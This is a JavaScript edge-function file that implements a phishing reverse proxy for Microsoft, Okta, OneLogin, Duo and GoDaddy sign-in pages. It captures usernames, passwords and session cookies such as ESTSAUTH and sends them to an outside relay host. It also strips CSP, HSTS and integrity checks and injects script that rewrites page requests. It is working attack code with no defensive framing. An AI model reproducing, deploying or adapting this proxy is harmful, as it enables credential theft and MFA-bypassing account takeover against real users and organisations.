export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy SSO' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'gui.godaddy.com': { type: 'godaddy', name: 'GoDaddy GUI' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie'],
  godaddy: ['akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${url}\nCookies:\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const firstSlash = withoutPrefix.indexOf('/');
    const upstreamDomain = firstSlash === -1 ? withoutPrefix : withoutPrefix.slice(0, firstSlash);
    const upstreamPath = firstSlash === -1 ? '/' : withoutPrefix.slice(firstSlash);
    return { upstream: upstreamDomain, type: IDENTITY_PROVIDERS[upstreamDomain]?.type || 'unknown', path: upstreamPath, isProxied: true };
  }
  return { upstream: INITIAL_UPSTREAM, type: 'microsoft', path: pathname, isProxied: false };
}

function cleanQueryString(search) {
  if (!search) return '';
  const params = new URLSearchParams(search);
  const result = Array.from(params.entries())
    .filter(([k]) => k !== 'path')
    .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
    .join('&');
  return result ? '?' + result : '';
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  return Object.keys(IDENTITY_PROVIDERS).some(d => hostname.includes(d)) ||
         /godaddy|secureserver|wsimg|microsoft|live|office|msauth/.test(hostname);
}

function rewriteLocation(location) {
  try {
    const u = new URL(location.startsWith('http') ? location : 'https://' + location);
    if (shouldProxyDomain(u.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${u.hostname}${u.pathname}${u.search}${u.hash}`;
    }
    return location;
  } catch (e) { return location; }
}

function generateInterceptorScript(upstreamDomain) {
  return `
<script>
(function() {
  const PROXY_DOMAIN = '${YOUR_DOMAIN}';
  const PROXY_PREFIX = '${PROXY_PREFIX}';
  const UPSTREAM = '${upstreamDomain}';

  function rewriteUrl(url) {
    if (!url || typeof url !== 'string') return url;
    if (/eventbus\/web|rum\/events|apm\//.test(url)) {
      console.log('[Proxy Interceptor] Silently blocked tracking:', url);
      return 'about:blank';
    }
    if (url.includes(PROXY_DOMAIN + PROXY_PREFIX)) return url;

    try {
      let u;
      if (url.startsWith('http')) u = new URL(url);
      else if (url.startsWith('//')) u = new URL('https:' + url);
      else if (url.startsWith('/')) return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + UPSTREAM + url;

      if (u && shouldProxyDomain(u.hostname)) {
        return 'https://' + PROXY_DOMAIN + PROXY_PREFIX + u.hostname + u.pathname + u.search + u.hash;
      }
    } catch(e) {}
    return url;
  }

  function shouldProxyDomain(h) {
    return /godaddy|secureserver|wsimg|microsoft|live|office|msauth/.test(h);
  }

  // Fetch override
  const origFetch = window.fetch;
  window.fetch = function(resource, init) {
    const rewritten = typeof resource === 'string' ? rewriteUrl(resource) : resource;
    return origFetch.call(this, rewritten, init);
  };

  // XHR override
  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    return origOpen.call(this, method, rewriteUrl(url));
  };

  console.log('[Proxy Interceptor] Loaded for upstream:', UPSTREAM);
})();
</script>`;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;

  console.log(`[${info.type.toUpperCase()}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': '*',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Credentials': 'true'
    }});
  }

  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let body = null;
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      const text = await cloned.text();
      body = text;

      // Credential capture
      if (text.includes('username=') || text.includes('passwd=') || text.includes('password=')) {
        const params = new URLSearchParams(text);
        const user = params.get('username') || params.get('loginfmt') || params.get('email');
        const pass = params.get('passwd') || params.get('password');
        if (user && pass) {
          console.log(`[CREDENTIALS] Captured for ${info.type}: ${user}`);
          await sendToVercel('credentials', { ip, user, pass, platform: info.type, url: request.url });
        }
      }
    } catch (e) { body = request.body; }
  }

  try {
    const fetchOpts = { method: request.method, headers, redirect: 'manual' };
    if (body !== null) fetchOpts.body = body;

    const resp = await fetch(upstreamUrl, fetchOpts);

    if ([301,302,303,307,308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      return new Response(null, { status: resp.status, headers: { Location: rewriteLocation(loc) } });
    }

    const newHeaders = new Headers(resp.headers);
    newHeaders.set('Access-Control-Allow-Origin', '*');
    newHeaders.set('Access-Control-Allow-Credentials', 'true');
    newHeaders.set('Access-Control-Allow-Methods', '*');
    newHeaders.set('Access-Control-Allow-Headers', '*');

    // Remove security headers
    ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'referrer-policy', 'permissions-policy'].forEach(h => newHeaders.delete(h));

    // Cookie handling + exfil
    const setCookies = resp.headers.getSetCookie?.() || [];
    if (setCookies.length) {
      setCookies.forEach(c => {
        let mod = c.replace(/Domain=[^;]+;?/gi, '').replace(/Secure;?/gi, '').replace(/SameSite=[^;]+;?/gi, '');
        mod += '; SameSite=None; Secure';
        newHeaders.append('Set-Cookie', mod);
      });
      if (request.method === 'POST') {
        await exfiltrateCookies(setCookies.join('; '), ip, info.type, request.url);
      }
    }

    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/json|text\/javascript|application\/javascript|text\/css/.test(ct)) {
      let text = await resp.text();

      if (ct.includes('text/html')) {
        text = text.replace('<head>', `<head>${generateInterceptorScript(upstreamDomain)}`);
        // SRI strip
        text = text.replace(/<(script|link)[^>]*?\s+integrity=["'][^"']*["'][^>]*>/gi, m => m.replace(/\s+integrity=["'][^"']*["']/i, ''));
      }

      // === CRITICAL REWRITING FIXES ===

      // 1. Logo / trust-center image fix (m365.8f1933cb.png)
      text = text.replace(
        /(src|href)=["']\/?trust-center\/_next\/static\/media\/([^"']+)["']/gi,
        `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/trust-center/_next/static/media/$2"`
      );

      // 2. General _next/static/media fix
      text = text.replace(
        /(src|href)=["']\/_next\/static\/media\/([^"']+)["']/gi,
        `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}sso.godaddy.com/_next/static/media/$2"`
      );

      // 3. Root-relative and other paths
      text = text.replace(/(src|href|action)=["']\/([^"']+)["']/gi, (match, attr, path) => {
        if (path.startsWith('_p/') || path.includes('data:') || path.startsWith('#')) return match;
        return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
      });

      // 4. GoDaddy-specific cleanup
      text = text.replace(/\/id-id\/godaddy-404/gi, '/');
      text = text.replace(/godaddy-404/gi, '');

      // 5. Full domain rewriting
      Object.keys(IDENTITY_PROVIDERS).forEach(d => {
        const esc = d.replace(/\./g, '\\.');
        text = text.replace(new RegExp('https?://' + esc + '([^"\'\\s)]*)', 'gi'),
          `https://${YOUR_DOMAIN}${PROXY_PREFIX}${d}$1`);
      });

      // 6. CSS url() fix
      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (match, fullUrl) => {
        try {
          const u = new URL(fullUrl);
          if (shouldProxyDomain(u.hostname)) {
            return `ur[](https://${YOUR_DOMAIN}${PROXY_PREFIX}${u.hostname}${u.pathname}${u.search})`;
          }
        } catch(e) {}
        return match;
      });

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error('Proxy error:', err);
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
